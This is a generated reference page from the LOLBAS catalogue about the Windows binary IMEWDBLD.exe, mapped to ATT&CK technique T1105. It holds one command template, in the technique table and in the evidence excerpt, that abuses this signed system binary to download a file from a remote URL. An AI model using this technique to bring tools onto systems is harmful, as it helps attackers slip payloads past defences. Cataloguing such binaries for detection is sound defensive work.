---
parsed_by: focuslocust
source: lolbas
type: generated
---
# IMEWDBLD.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `imewdbld.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/IMEWDBLD.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Microsoft IME Open Extended Dictionary Module

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/imewdbld.md)
- Source verification: [source record](../../sources/lolbas/imewdbld.exe.md)

## Aliases

- `IMEWDBLD.exe`
- `imewdbld.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/imewdbld.exe.md)

## Source Verification

[source record](../../sources/lolbas/imewdbld.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@notwhickey'
Person: Wade Hickey
Author: Wade Hickey
Commands:
- Category: Download
Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file
```
